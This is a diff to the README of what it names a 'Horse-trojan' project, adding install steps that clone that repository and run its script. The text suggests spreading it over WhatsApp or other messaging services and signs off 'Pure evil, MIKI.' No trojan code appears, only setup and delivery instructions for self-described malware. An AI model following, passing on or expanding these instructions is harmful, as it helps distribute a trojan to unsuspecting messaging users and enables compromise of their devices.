@@ -7,10 +7,10 @@ Please make sure no use it on tiktok/instagram/discord
 use it on Whatsapp or any massages services.
 
 installation:
-sudo apt update
-sudo apt install git
-sudo apt isntall python3
-git clone (the repo link) in (code)
+sudo apt update,
+sudo apt install git,
+sudo apt install python3,
+git clone https://github.com/FII-Miki/HelloWorld-Horse-trojan.git
 python3 new.py
 
 Pure evil, MIKI.
